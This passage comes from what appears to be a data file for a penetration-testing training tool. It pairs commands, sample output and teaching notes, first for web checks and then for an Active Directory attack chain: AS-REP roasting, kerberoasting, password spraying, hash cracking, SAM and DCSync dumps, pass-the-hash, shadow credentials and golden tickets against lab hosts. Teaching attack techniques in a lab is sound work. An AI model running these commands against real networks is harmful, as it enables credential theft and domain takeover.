        '| Subject Alternative Name: DNS:dev.acme.internal, DNS:vault.acme.internal',
        '|_  Not valid after:  2025-11-01T00:00:00',
        '| ssl-enum-ciphers:',
        '|_  TLSv1.0: (weak)',
      ].join('\n'),
      signal: '| Subject Alternative Name: DNS:dev.acme.internal, DNS:vault.acme.internal',
      teach: 'A TLS certificate leaks names. The Subject and SAN fields often reveal internal hostnames (like vault.acme.internal) you had no other way to discover. The cipher list and expiry are reporting findings too.',
    },
    'check-http-methods': {
      why: "A one-request check for a classic misconfiguration: an OPTIONS request lists which HTTP verbs the server allows, and dangerous ones (PUT, DELETE, TRACE) are reportable on their own. It also feeds verb-tampering: a permitted PUT can mean you upload a shell. Run it on any web server; it is instant and exam-safe. Treat an enabled PUT or DELETE as a lead to chase, not just a line in the report.",
      cmd: 'curl -sSIkLX OPTIONS http://10.10.10.10/', tool: 'curl',
      output: [
        'HTTP/1.1 200 OK',
        'Allow: GET, HEAD, POST, PUT, DELETE, OPTIONS',
      ].join('\n'),
      signal: 'Allow: GET, HEAD, POST, PUT, DELETE, OPTIONS',
      teach: 'OPTIONS reports which verbs the server accepts. PUT or DELETE in the list is a red flag, PUT can mean you upload a web shell directly, no injection needed.',
    },
    'check-cors': {
      why: "A permissive CORS policy, reflecting any Origin you send or allowing \"null\", lets a malicious site read authenticated responses, which is a genuinely high-value web finding. One request with a spoofed Origin header settles it. Run it whenever the app has authenticated data that is reachable cross-origin. It is a report win that now and then escalates into real data theft.",
      cmd: 'curl -sSIkL -H "Origin: https://evil.example" http://10.10.10.10/api/me', tool: 'curl',
      output: [
        'HTTP/1.1 200 OK',
        'Access-Control-Allow-Origin: https://evil.example',
        'Access-Control-Allow-Credentials: true',
      ].join('\n'),
      signal: 'Access-Control-Allow-Origin: https://evil.example',
      teach: 'The server reflected your arbitrary Origin AND allows credentials, a CORS misconfiguration. A malicious page could read a logged-in victim\'s API responses, including their data and tokens. Reflected Origin + credentials:true is the dangerous pair.',
    },
    'check-http-redirect': {
      why: "A plain-HTTP site that serves content instead of redirecting to HTTPS exposes everything in transit, a standard report finding. A single HEAD of http:// (without following redirects) shows whether it redirects or serves in the clear. Run it as part of your web hygiene checks; it is one request and never touches application logic. Low severity, but it belongs in every report.",
      cmd: 'curl -sSIk http://10.10.10.10/', tool: 'curl',
      output: [
        'HTTP/1.1 301 Moved Permanently',
        'Location: https://dev-internal.acme.internal/',
      ].join('\n'),
      signal: 'Location: https://dev-internal.acme.internal/',
      teach: 'A redirect can leak an internal hostname in its Location header, dev-internal.acme.internal is a name you had no other way to learn. Add it to /etc/hosts and your target list; the redirect just widened the attack surface.',
    },
    'check-subdomain-takeover': {
      why: "When a DNS name is a CNAME pointing at a third-party service (S3, GitHub Pages, Heroku) that nobody owns anymore, you can register it yourself and take over the name, which is high impact for one DNS lookup. Run it when you have subdomains and some of their CNAMEs point off-site. Most will be claimed; the one dangling CNAME is worth the whole exercise.",
      cmd: 'dig +noall +answer CNAME shop.acme.internal', tool: 'dig',
      output: [
        'shop.acme.internal.  300  IN  CNAME  acme-shop.herokuapp.com.',
      ].join('\n'),
      signal: 'shop.acme.internal.  300  IN  CNAME  acme-shop.herokuapp.com.',
      teach: 'A CNAME pointing at a cloud service that is no longer claimed is a subdomain takeover: register the dangling target yourself and you control content on the victim\'s trusted subdomain. Confirm by visiting it and seeing an unclaimed-app page.',
    },
    'check-dns-email': {
      why: "Missing or permissive SPF and DMARC records mean the domain can be spoofed in phishing, a routine report finding whenever the engagement scope includes a domain. Two TXT lookups answer it, with no scanning. Run it when you have a domain in scope. It will not get you a shell, but it is a reliable, defensible finding for the report.",
      cmd: 'dig +short TXT _dmarc.acme.internal', tool: 'dig',
      output: [
        '"v=DMARC1; p=none; rua=mailto:dmarc@acme.internal"',
      ].join('\n'),
      signal: '"v=DMARC1; p=none; rua=mailto:dmarc@acme.internal"',
      teach: 'Email records say whether a domain can be spoofed. DMARC p=none means forged mail from this domain is unlikely to be rejected, a phishing lead in a real engagement, a reporting finding on the exam.',
    },
    'check-web-headers': {
      why: "Security headers are the easiest report wins there are: a missing HSTS, CSP, or X-Frame-Options, or a Server header leaking the exact version. One HEAD request surfaces them all. Run it on every web app early; it costs nothing and never risks the target. The leaked version header also feeds your CVE search, so read it for leads, not just findings.",
      cmd: 'curl -sSIkL http://10.10.10.10/', tool: 'curl',
      output: [
        'HTTP/1.1 200 OK',
        'Server: Apache/2.4.49 (Unix)',
        'X-Powered-By: PHP/7.4.3',
        '# (no Content-Security-Policy, no X-Frame-Options)',
      ].join('\n'),
      signal: 'X-Powered-By: PHP/7.4.3',
      teach: 'Response headers hand you the stack for free and show what protections are missing. X-Powered-By leaks the PHP version; the absence of CSP and X-Frame-Options are reporting findings. Read the headers before anything clever.',
    },
    'check-web-components': {
      why: "Before any CVE can fire you have to know exactly what the app is built from, and this reads the page's script sources, generator meta, Server header, and framework cookies to fingerprint the components and versions. It is the input the CVE catalog matches against. Run it on every web app right after triage; a precise fingerprint is what turns \"maybe vulnerable\" into a named exploit to try.",
      cmd: 'curl -sSikL http://10.10.10.10/', tool: 'curl',
      output: [
        'HTTP/1.1 200 OK',
        'Server: Apache/2.4.49 (Unix)',
        'Set-Cookie: PHPSESSID=8f2...; path=/',
        '<meta name="generator" content="Joomla! 3.9">',
      ].join('\n'),
      signal: '<meta name="generator" content="Joomla! 3.9">',
      teach: 'Between the headers and the page body, the component stack is usually visible, here a generator meta tag names Joomla 3.9. A pinned CMS version maps straight to known exploits; identify it before you attack.',
    },
    'check-cms-version': {
      why: "Fingerprinting the CMS tells you what it is; pinning the exact version tells you whether its known CVEs apply, and version-gated exploits fail silently against the wrong build. This reads the files that publish the version (CHANGELOG, readme, composer.lock). Run it once you know the CMS and want to match it to an exploit. The exact version is the difference between a working CVE and a wasted hour.",
      cmd: 'curl -sSkL http://10.10.10.10/CHANGELOG.txt', tool: 'curl',
      output: [
        'Drupal 7.57, 2018-02-21',
        '----------------------',
      ].join('\n'),
      signal: 'Drupal 7.57, 2018-02-21',
      teach: 'CMSes leak their version in changelogs, readme files, and meta tags. A pinned version like Drupal 7.57 maps straight to known exploits (here Drupalgeddon2, CVE-2018-7600). Identify the CMS and its exact build, then look up what breaks it.',
    },
    'check-web-body': {
      why: "Reading the page body catches findings the header checks miss: insecure http:// resource references on an HTTPS page, a login form that allows autocomplete, a POST form with no anti-CSRF token. One GET surfaces them. Run it as part of your web review; it is read-only and exam-safe. Small findings individually, but they round out the report and sometimes flag a form worth attacking.",
      cmd: 'curl -sSkL http://10.10.10.10/', tool: 'curl',
      output: [
        '<form action="/login.php" method="post">',
        '<!-- TODO: remove test login test/test before go-live -->',
        '</form>',
      ].join('\n'),
      signal: '<!-- TODO: remove test login test/test before go-live -->',
      teach: 'View the source. Developers leave credentials, debug endpoints, and TODOs in HTML comments and JavaScript all the time. A test/test login left in a comment is a free set of working credentials, read the page humans never read.',
    },
    'check-exposed-files': {
      why: "A quick GET of the usual leaked paths, a .git tree, a .env, server-status, an editor backup, turns up source and secrets that were never meant to be web-served. It is read-only and takes seconds. Run it on every web app; the payoff is wildly out of proportion to the effort, a single readable .env can hand you database and API credentials outright.",
      cmd: 'curl -sSkL http://10.10.10.10/.env', tool: 'curl',
      output: [
        'APP_ENV=production',
        'DB_HOST=127.0.0.1',
        'DB_PASSWORD=sup3rs3cret',
      ].join('\n'),
      signal: 'DB_PASSWORD=sup3rs3cret',
      teach: 'Framework apps keep secrets in a .env file that should never be web-reachable. When it is, it leaks database and API credentials outright. Always probe for .env, .git/HEAD, and server-status before anything else.',
    },

    // ============================ ACTIVE DIRECTORY ============================
    'ad-dc-identify': {
      why: "Nothing in the AD playbook works until you know the domain name and which host is the DC, so this is the mandatory first step the moment a scan shows the AD fingerprint (88, 389, 445 together). It names the domain and finds the DC, and those two facts feed every later command, impacket, nxc, and kerbrute all need the domain and the DC IP. Getting the domain FQDN exactly right matters, Kerberos is picky, and a wrong domain name is behind half the \"impacket is broken\" complaints.",
      cmd: "nxc ldap 10.10.10.10 -u '' -p ''", tool: 'nxc',
      output: [
        'SMB   10.10.10.10  445  DC01  [*] Windows Server 2019 Build 17763 (name:DC01) (domain:acme.internal)',
        'LDAP  10.10.10.10  389  DC01  [+] Anonymous bind to LDAP succeeded',
        'LDAP  10.10.10.10  389  DC01  [*] Base DN: DC=acme,DC=internal',
      ].join('\n'),
      signal: 'SMB   10.10.10.10  445  DC01  [*] Windows Server 2019 Build 17763 (name:DC01) (domain:acme.internal)',
      teach: 'nxc against LDAP names the host (DC01) and the domain (acme.internal) and gives the base DN, the three facts every later AD command needs. Kerberos (88) + LDAP (389) + SMB (445) on one host is the fingerprint of a Domain Controller.',
    },
    'ad-anon-ldap-enum': {
      why: "Many lab DCs allow an anonymous LDAP bind, and when they do it hands you the base DN and often the entire user and group list, description fields included, where admins love to stash a password \"temporarily\". It costs one unauthenticated query. Reach for it right after identifying the DC, before you hold any credential. A user list from here is the raw material for roasting and spraying, so it often bootstraps your whole domain attack.",
      cmd: "nxc ldap 10.10.10.10 -u '' -p '' --users", tool: 'nxc',
      output: [
        'LDAP  10.10.10.10  389  DC01  [*] Enumerated domain users',
        'LDAP  10.10.10.10  389  DC01  Administrator',
        'LDAP  10.10.10.10  389  DC01  tgibson',
        'LDAP  10.10.10.10  389  DC01  jbloggs',
        'LDAP  10.10.10.10  389  DC01  svc_sql',
      ].join('\n'),
      signal: 'LDAP  10.10.10.10  389  DC01  tgibson',
      teach: 'If anonymous LDAP bind is allowed, you can list every domain user with no credentials at all. That user list is the raw material for AS-REP roasting and password spraying, the two no-creds ways into the domain.',
    },
    'ad-user-enum': {
      why: "Kerberos is an oracle: the KDC answers differently for real usernames than fake ones, so you can confirm valid accounts with no credential at all, and a null SMB session sometimes lists them over RPC too. Reach for it early when you need a user list and anonymous LDAP did not give you one. A verified username list is the prerequisite for AS-REP roasting and spraying, you cannot spray passwords at users you have not confirmed exist.",
      cmd: 'kerbrute userenum --dc 10.10.10.10 -d acme.internal users.txt', tool: 'kerbrute',
      output: [
        '2026/09/17 10:41:02 >  Using KDC(s): 10.10.10.10:88',
        '2026/09/17 10:41:03 >  [+] VALID USERNAME: tgibson@acme.internal',
        '2026/09/17 10:41:03 >  [+] VALID USERNAME: jbloggs@acme.internal',
        '2026/09/17 10:41:05 >  Done! Tested 48 usernames (2 valid) in 2.8s',
      ].join('\n'),
      signal: '2026/09/17 10:41:03 >  [+] VALID USERNAME: tgibson@acme.internal',
      teach: 'kerbrute asks the KDC (port 88) whether each username exists, valid names get a different Kerberos error than bad ones, and it never submits a password, so it does not lock accounts. A confirmed list feeds roasting and spraying.',
    },
    'asrep-roast': {
      why: "This is the credential-free attack everyone tries first in AD, because it needs only a username list: any account flagged DONT_REQUIRE_PREAUTH will hand out an AS-REP whose encrypted part is the user's password hash, with no login required. Reach for it the moment you have usernames. It is pure upside, you lose nothing by asking, and a single pre-auth-disabled account with a weak password can be your entire way in.",
      cmd: "nxc ldap 10.10.10.10 -u users.txt -p '' --asreproast asrep.hash", tool: 'nxc',
      output: [
        'LDAP  10.10.10.10  389  DC01  [+] tgibson has UF_DONT_REQUIRE_PREAUTH set',
        '$krb5asrep$23$tgibson@ACME.INTERNAL:a3b5c7...e1f9:9c2d...8b',
      ].join('\n'),
      signal: '$krb5asrep$23$tgibson@ACME.INTERNAL:a3b5c7...e1f9:9c2d...8b',
      teach: 'An account with pre-auth disabled (UF_DONT_REQUIRE_PREAUTH) hands out an AS-REP encrypted with its password hash to anyone who asks, no credentials needed. Capture that $krb5asrep$ hash and crack it offline.',
    },
    'crack-asrep': {
      why: "The $krb5asrep$ hash you roasted cracks offline on your own box, turning a configuration flaw into a real credential. Reach for it immediately after roasting. These are often service accounts with weak passwords, so rockyou frequently cracks them; if it does not, the account has a strong password and you move on. The cracked plaintext is a validated domain login, usually your first real foothold into the directory.",
      cmd: 'hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt', tool: 'hashcat',
      output: [
        '$krb5asrep$23$tgibson@ACME.INTERNAL:a3b5c7...e1f9:9c2d...8b:Autumn2026!',
        'Status...........: Cracked',
      ].join('\n'),
      signal: 'Status...........: Cracked',
      teach: 'The AS-REP hash (mode 18200) is encrypted with the user\'s password, so it cracks offline at full GPU speed with no lockout. "Cracked" means you now hold tgibson\'s real password, a foothold credential in the domain.',
    },
    'gpp-passwords': {
      why: "Old Group Policy Preferences stored local-account passwords in XML under SYSVOL, a share every domain user (sometimes even anonymous) can read, and Microsoft published the AES key, so the \"encryption\" is reversible. Reach for it whenever you have any domain read access. It is a free credential sitting in a world-readable share, and the recovered local-admin password frequently reuses across many machines, which is why it is still worth checking every time.",
      cmd: "smbclient '//10.10.10.10/SYSVOL' -N -c 'recurse; ls'", tool: 'smbclient',
      output: [
        '\\acme.internal\\Policies\\{31B2F340-...}\\MACHINE\\Preferences\\Groups\\Groups.xml',
        '  userName="svc_admin"',
        '  cpassword="j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdQ"',
      ].join('\n'),
      signal: '  cpassword="j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdQ"',
      teach: 'Group Policy Preferences stored passwords in SYSVOL encrypted with a key Microsoft published. Any domain user can read Groups.xml and decrypt the cpassword with gpp-decrypt, a free set of working credentials.',
    },
    'smb-share-inventory': {
      why: "A readable SMB share is where admins leave what they should not: configs, backups, scripts, password files. So once you have any credential (or an anonymous session), recursively inventory every readable share, because the win is often just sitting in one. Reach for it early in the domain. It is unglamorous but high-yield, more boxes fall to a password in a share than to any clever Kerberos attack.",
      cmd: "nxc smb 10.10.10.10 -u jbloggs -p 'Autumn2026!' -M spider_plus", tool: 'nxc',
      output: [
        'SMB  10.10.10.10  445  FILE01  [+] acme.internal\\jbloggs:Autumn2026!',
        'SPIDER_PLUS  Finance\\Payroll\\Q4-2023-summary.xlsx (18 KB)',
        'SPIDER_PLUS  IT\\scripts\\deploy.ps1 (contains a password)',
      ].join('\n'),
      signal: 'SPIDER_PLUS  IT\\scripts\\deploy.ps1 (contains a password)',
      teach: 'With any valid credential, spider_plus walks every readable share and lists interesting files. Scripts, spreadsheets, and configs on file shares routinely contain the next credential, loot the shares before you do anything loud.',
    },
    'kerberoast': {
      why: "Kerberoasting is the authenticated cousin of AS-REP roasting: any domain user can request service tickets for accounts that have an SPN (service accounts), and each ticket is encrypted with that account's password hash. Reach for it as soon as you hold any domain credential. Service accounts are the target because their passwords are human-set, rarely rotated, and often over-privileged, so one crack can jump you well up the ladder.",
      cmd: "nxc ldap 10.10.10.10 -u jbloggs -p 'Autumn2026!' --kerberoasting tgs.hash", tool: 'nxc',
      output: [
        'LDAP  10.10.10.10  389  DC01  [+] Found SPN: MSSQLSvc/db01.acme.internal (svc_sql)',
        '$krb5tgs$23$*svc_sql$ACME.INTERNAL$MSSQLSvc*...:3f2a...:9d8c...',
      ].join('\n'),
      signal: '$krb5tgs$23$*svc_sql$ACME.INTERNAL$MSSQLSvc*...:3f2a...:9d8c...',
      teach: 'Any authenticated user can request a service ticket for an account that has an SPN. That ticket is encrypted with the service account\'s password hash, so you crack it offline. Service accounts often have weak, rarely-rotated passwords.',
    },
    'crack-tgs': {
      why: "The $krb5tgs$ ticket you roasted cracks offline to the service account's plaintext. Reach for it right after kerberoasting. Service accounts often carry weak, never-expiring passwords and elevated rights, so a crack here is frequently a big step up, sometimes straight to Domain Admin if the account is over-privileged. If rockyou does not break it, the password is strong, so note it and look elsewhere rather than grinding.",
      cmd: 'hashcat -m 13100 tgs.hash /usr/share/wordlists/rockyou.txt', tool: 'hashcat',
      output: [
        '$krb5tgs$23$*svc_sql$ACME.INTERNAL$MSSQLSvc*...:3f2a...:9d8c...:P@ssw0rd2023',
        'Status...........: Cracked',
      ].join('\n'),
      signal: 'Status...........: Cracked',
      teach: 'A Kerberoasted service ticket (mode 13100) cracks offline, the DC never sees your guesses, so there is no lockout. "Cracked" means you now hold svc_sql\'s cleartext password, often a path to a database or a privileged service.',
    },
    'password-spray': {
      why: "Spraying flips brute-forcing on its head: one likely password tried against many accounts, which stays under the lockout thresholds that per-account brute-forcing would trip. Reach for it when you have a user list but no credential, using seasonal or company-themed guesses (Summer2026!, Welcome1). It is careful by design, respect the lockout policy and spray slowly, and it works because in any large org someone always has the weak password you guessed.",
      cmd: "nxc smb 10.10.10.10 -u users.txt -p 'Autumn2026!' --continue-on-success", tool: 'nxc',
      output: [
        'SMB  10.10.10.10  445  DC01  [-] acme.internal\\Administrator:Autumn2026! STATUS_LOGON_FAILURE',
        'SMB  10.10.10.10  445  DC01  [+] acme.internal\\jbloggs:Autumn2026! ',
      ].join('\n'),
      signal: 'SMB  10.10.10.10  445  DC01  [+] acme.internal\\jbloggs:Autumn2026! ',
      teach: 'Spraying tries ONE password across many users (never many passwords at one user, that locks accounts). One seasonal guess often lands a valid login, as it did for jbloggs. Always check the lockout policy (--pass-pol) first.',
    },
    'bloodhound-collect': {
      why: "An AD environment is a graph of users, groups, sessions, ACLs, and delegation, and BloodHound draws the attack paths manual browsing would never reveal, like \"your low-priv user reaches Domain Admin in three ACL hops\". Reach for it once you have any domain credential. It turns a confusing directory into a map with a shortest path, which is why it is the standard first move after a foothold, just remember every edge it draws can also be queried by hand.",
      cmd: "nxc ldap 10.10.10.10 -u jbloggs -p 'Autumn2026!' --bloodhound -c All --dns-server 10.10.10.10", tool: 'nxc',
      output: [
        'LDAP  10.10.10.10  389  DC01  [+] Collected 142 users, 38 groups, 12 computers',
        'LDAP  10.10.10.10  389  DC01  [*] Compressed data written to acme_bloodhound.zip',
      ].join('\n'),
      signal: 'LDAP  10.10.10.10  389  DC01  [*] Compressed data written to acme_bloodhound.zip',
      teach: 'BloodHound collection pulls the whole directory (users, groups, ACLs, sessions) into a zip you import into the BloodHound UI. There you ask "shortest path to Domain Admins" and it draws the attack chain for you. Collect first, analyse second.',
    },
    'adcs-esc': {
      why: "Active Directory Certificate Services, misconfigured, lets a certificate become a credential for any identity, and the ESC1-11 family covers the many ways that happens; certipy find -vulnerable names the exact ESC number so you know which abuse applies. Reach for it when you have a domain credential and a CA in the environment. It is one of the most reliable modern paths to Domain Admin, so checking for vulnerable templates early is well worth it.",
      cmd: "certipy find -u jbloggs@acme.internal -p 'Autumn2026!' -dc-ip 10.10.10.10 -vulnerable", tool: 'certipy',
      output: [
        'Certificate Templates',
        '  Template Name            : UserEnroll',
        '  Enrollment Rights        : ACME\\Domain Users',
        '  [!] Vulnerabilities      : ESC1 - Enrollee supplies subject + client auth',
      ].join('\n'),
      signal: '  [!] Vulnerabilities      : ESC1 - Enrollee supplies subject + client auth',
      teach: 'A misconfigured certificate template (ESC1) lets any user request a cert as anyone, including a Domain Admin. certipy finds it; the Vulnerabilities line is your path. AD CS is a frequent, high-impact domain-takeover route.',
    },
    'cert-authenticate': {
      why: "A certificate issued for a principal (from an ADCS ESC abuse or shadow credentials) authenticates as that principal through PKINIT, and certipy auth returns a TGT and, via UnPAC-the-hash, the account's NT hash too. Reach for it right after you mint or steal a certificate. It is the step that converts \"I have a certificate\" into \"I am this user and here is their hash\", which is what makes the ADCS and shadow-credential paths actually pay off.",
      cmd: 'certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10', tool: 'certipy',
      output: [
        '[*] Using principal: administrator@acme.internal',
        '[*] Trying to get TGT...',
        '[+] Got hash for administrator@acme.internal: aad3b...:31d6cfe0d16...',
      ].join('\n'),
      signal: '[+] Got hash for administrator@acme.internal: aad3b...:31d6cfe0d16...',
      teach: 'A certificate you obtained (via ESC1, Shadow Credentials, etc.) authenticates over PKINIT and hands back the account\'s NT hash. From there you pass-the-hash, the certificate was just the key that unlocked the credential.',
    },
    'lateral-exec': {
      why: "Valid credentials with local-admin rights are code execution, and the only question is which tool: psexec (loud, service-based), wmiexec (quieter, semi-interactive), or evil-winrm (a full shell on 5985). Reach for it once you hold admin creds for a host and want a shell on it. Knowing the tradeoffs matters, psexec is reliable but noisy and drops a service, so on a monitored box you reach for wmiexec or WinRM instead.",
      cmd: "nxc smb 10.10.10.20 -u svc_admin -p 'Password123'", tool: 'nxc',
      output: [
        'SMB  10.10.10.20  445  WEB01  [*] Windows Server 2019 (name:WEB01) (domain:acme.internal)',
        'SMB  10.10.10.20  445  WEB01  [+] acme.internal\\svc_admin:Password123 (Pwn3d!)',
      ].join('\n'),
      signal: 'SMB  10.10.10.20  445  WEB01  [+] acme.internal\\svc_admin:Password123 (Pwn3d!)',
      teach: '"Pwn3d!" marks every host where a credential is local admin. Spraying a working cred across the subnet maps your lateral movement, each Pwn3d! box is a new shell (via nxc -x, psexec, or evil-winrm) and new loot.',
    },
    'ad-path-manual': {
      why: "BloodHound is a convenience, not a requirement, and every edge it draws is a directory fact you can query by hand with nxc, bloodyAD, or ldapsearch. Reach for these first, because you often find the winning path (a roastable account, a writable group, a DCSync grant) before SharpHound even finishes, and you never depend on the collection landing or the GUI parsing. When BloodHound fails or returns nothing useful, this is how you keep moving.",
      cmd: "nxc ldap 10.10.10.10 -u jbloggs -p 'Autumn2026!' --admin-count", tool: 'nxc',
      output: [
        'LDAP  10.10.10.10  389  DC01  [*] Accounts with adminCount=1 (protected / privileged)',
        'LDAP  10.10.10.10  389  DC01  Administrator',
        'LDAP  10.10.10.10  389  DC01  svc_backup  (member of Backup Operators)',
      ].join('\n'),
      signal: 'LDAP  10.10.10.10  389  DC01  svc_backup  (member of Backup Operators)',
      teach: 'When you cannot run BloodHound, you can still find privileged targets by hand, adminCount=1 flags protected accounts. svc_backup in Backup Operators can read the SAM/NTDS, a direct privilege path worth chasing.',
    },
    'dump-secrets': {
      why: "Admin on a Windows host hands you its secrets (SAM hashes, LSASS, cached logons); admin on a DC hands you the whole domain (NTDS.dit, every hash). So this is what you do the moment you get administrative access anywhere. Reach for it after any privileged foothold. The dumped hashes feed pass-the-hash, cracking, and lateral movement, and on a DC the dump is effectively game over.",
      cmd: "nxc smb 10.10.10.10 -u administrator -p 'P@ss' --sam", tool: 'nxc',
      output: [
        'SMB  10.10.10.10  445  DC01  [+] Dumping SAM hashes',
        'Administrator:500:aad3b435b51404ee...:31d6cfe0d16ae931b73c59d7e0c089c0:::',
        'svc-backup:1104:aad3b435b51404ee...:7c6a180b36896a0a8c02787eeafb0e4c:::',
      ].join('\n'),
      signal: 'Administrator:500:aad3b435b51404ee...:31d6cfe0d16ae931b73c59d7e0c089c0:::',
      teach: 'With local admin you can dump the SAM, the local account hashes. The :500 Administrator hash can be passed to other machines (local admins are often reused), and the rest feed cracking. On a DC, --ntds dumps the whole domain.',
    },
    'dcsync': {
      why: "DCSync is the clean way to steal every password in the domain: an account with replication rights (GetChanges + GetChangesAll) asks a DC to replicate password data, so you get the hashes without ever logging onto the DC or dumping NTDS by hand. Reach for it the instant you hold replication rights, whether from Domain Admin or an ACL abuse that granted them. The krbtgt hash it returns is the key to golden tickets, so it is both loot and a persistence setup.",
      cmd: "impacket-secretsdump 'acme.internal/svc_backup:P@ss'@10.10.10.10 -just-dc", tool: 'impacket-secretsdump',
      output: [
        '[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)',
        'acme.internal\\Administrator:500:aad3b...:31d6cfe0d16ae931b73c59d7e0c089c0:::',
        'acme.internal\\krbtgt:502:aad3b...:1a59bd44fdb8f9f4a3f8c9d2e5b7a6c1:::',
      ].join('\n'),
      signal: 'acme.internal\\krbtgt:502:aad3b...:1a59bd44fdb8f9f4a3f8c9d2e5b7a6c1:::',
      teach: 'DCSync asks the DC to replicate password data, it needs replication rights (Domain Admin, or a delegated edge). It returns every hash in the domain, including krbtgt (the key to forge golden tickets). This is total domain compromise.',
    },
    'own-domain-pth': {
      why: "Once DCSync or an NTDS dump has handed you every hash, the built-in Administrator (RID 500) is among them, and there is nothing left to crack, you pass that NT hash straight into a login and you are Domain Admin. Reach for it to cash in a completed dump. It is the anticlimactic final step that proves the domain is yours, and it is why \"just crack the password\" is unnecessary at the end: the hash is the credential.",
      cmd: 'nxc smb 10.10.10.10 -u administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0 -x whoami', tool: 'nxc',
      output: [
        'SMB  10.10.10.10  445  DC01  [+] acme.internal\\administrator:31d6... (Pwn3d!)',
        'SMB  10.10.10.10  445  DC01  [+] Executed command',
        'SMB  10.10.10.10  445  DC01  nt authority\\system',
      ].join('\n'),
      signal: 'SMB  10.10.10.10  445  DC01  nt authority\\system',
      teach: 'You never need to crack the Administrator hash, you pass it. nxc -H authenticates with the NT hash directly and runs a command; "nt authority\\system" confirms you own the box. This is the payoff of dumping or DCSyncing the hash.',
    },
    'shadow-credentials': {
      why: "When you hold GenericWrite over a computer or user object, you can add your own key to its msDS-KeyCredentialLink attribute and then authenticate as that object via PKINIT, with no password reset and without touching its existing credentials. Reach for it when an ACL abuse or relay gives you write over a target. It is stealthier than resetting a password (you add a key rather than changing anything they would notice) and it is the modern go-to for abusing GenericWrite.",
      cmd: 'pywhisker.py -d acme.internal -u jbloggs -p Autumn2026! --target svc_app --action add', tool: 'pywhisker',
      output: [
        '[*] Adding Key Credential to msDS-KeyCredentialLink of svc_app',
        '[+] Saved PFX (#PKCS12) to svc_app.pfx (password: a1b2c3)',
      ].join('\n'),
      signal: '[+] Saved PFX (#PKCS12) to svc_app.pfx (password: a1b2c3)',
      teach: 'Shadow Credentials abuses write access to an account\'s msDS-KeyCredentialLink: you add your own certificate, then authenticate as the account via PKINIT (certipy auth) to recover its NT hash. A quiet alternative to resetting a password.',
    },
    'golden-ticket': {
      why: "The krbtgt hash lets you forge TGTs for any user with any group membership, which is persistence that survives password resets on every account except krbtgt itself. Reach for it after you own the domain and want durable access, or to impersonate a specific identity. It is a post-Domain-Admin tool, not a way in, you need krbtgt first, and because krbtgt is almost never rotated, a golden ticket can keep you in for a very long time.",
      cmd: 'impacket-ticketer -nthash 1a59bd44... -domain-sid S-1-5-21-... -domain acme.internal administrator', tool: 'impacket-ticketer',
      output: [
        '[*] Creating basic skeleton ticket and PAC Infos',
        '[*] Customizing ticket for acme.internal/administrator',
        '[+] Saving ticket in administrator.ccache',
      ].join('\n'),
      signal: '[+] Saving ticket in administrator.ccache',
      teach: 'With the krbtgt hash you forge a TGT for any user, valid until krbtgt is rotated twice, the ultimate persistence. This is a post-compromise move: you already own the domain, and the golden ticket keeps you in.',
    },
    'trust-enum': {
      why: "Domain and forest trusts let one domain's users authenticate to another, and misconfigured trusts turn one owned domain into two. Reach for it after you get any domain foothold, because the box you landed on may trust (or be trusted by) a richer domain you did not know existed. Enumerating trusts early keeps you from declaring victory too soon, the real target is sometimes across a trust you have not looked at yet.",
      cmd: 'nltest /domain_trusts', tool: 'nltest',
      output: [
        'List of domain trusts:',
        '  0: ACME acme.internal (NT 5) (Forest Tree Root) (Primary Domain)',
        '  1: DEV dev.acme.internal (NT 5) (Direct Outbound)',
        'The command completed successfully',
      ].join('\n'),
      signal: '  1: DEV dev.acme.internal (NT 5) (Direct Outbound)',
      teach: 'Domains rarely stand alone. A trust to dev.acme.internal means credentials or tickets from one domain may reach the other, the path to the goal sometimes runs through a trusted domain, not the one you landed in.',
    },
    'zerologon-check': {
      why: "Zerologon is catastrophic (an unauthenticated attacker can reset a DC's machine-account password and seize the domain), and the CHECK is completely safe: it verifies the patch level without changing anything. Reach for it on any DC that might be unpatched. Always run the check before the exploit, because the exploit itself is destructive, so you confirm vulnerability first, then decide whether the risky exploit is worth it.",
      cmd: 'zerologon-scan DC01 10.10.10.10', tool: 'zerologon-scan',
      output: [
        'Performing authentication attempts...',
        '==============================',
        'Success! DC01 is vulnerable to Zerologon (CVE-2020-1472).',
      ].join('\n'),
      signal: 'Success! DC01 is vulnerable to Zerologon (CVE-2020-1472).',
      teach: 'Zerologon checks whether a DC accepts an all-zero challenge to reset its own machine password. The check is safe; the exploit is NOT, it breaks the DC\'s secure channel and must be restored afterward. Confirm it is a lab you own before going further.',
    },
    'wsus-abuse': {
      why: "WSUS pushes updates to every Windows machine in the domain, and where it is misconfigured to use cleartext HTTP you can MITM that channel and deliver a malicious \"update\" that runs as SYSTEM on the clients. Reach for it when you find a WSUS server on HTTP and can position between it and its clients. It is niche but powerful, one misconfigured update server is code execution across the whole fleet, so it is worth recognising when you see it.",
      cmd: 'reg query HKLM\\Software\\Policies\\Microsoft\\Windows\\WindowsUpdate /v WUServer', tool: 'reg',
      output: [
        '    WUServer    REG_SZ    http://wsus.acme.internal:8530',
        '# served over HTTP, not HTTPS',
      ].join('\n'),
      signal: '    WUServer    REG_SZ    http://wsus.acme.internal:8530',
      teach: 'WSUS served over plain HTTP lets an attacker who can approve updates push a signed Microsoft binary with attacker-chosen arguments to clients, running as SYSTEM. An internal patch server is a high-value, often-overlooked target.',
    },
    'sccm-enum': {
      why: "SCCM manages software deployment across the entire fleet, so taking it over means pushing code to everything as SYSTEM, and even short of takeover, enumerating it leaks credentials like the Network Access Account. Reach for it when you find SCCM in the environment. It is an increasingly common path in modern AD, the management infrastructure is a high-value target precisely because it is trusted to run code everywhere.",
      cmd: "sccmhunter find -u jbloggs -p 'Autumn2026!' -d acme.internal -dc-ip 10.10.10.10", tool: 'sccmhunter',
      output: [
        '[+] Management Point found: MP01.acme.internal',
        '[+] Network Access Account retrievable from policy',
        'ACME\\svc_naa : NAA-P@ssw0rd',
      ].join('\n'),
      signal: 'ACME\\svc_naa : NAA-P@ssw0rd',
      teach: 'SCCM/MECM stores Network Access Account credentials that clients can retrieve, frequently over-privileged and reusable across the domain. Enumerating the management point often hands you a working service credential outright.',
    },
    'nxc-arsenal': {
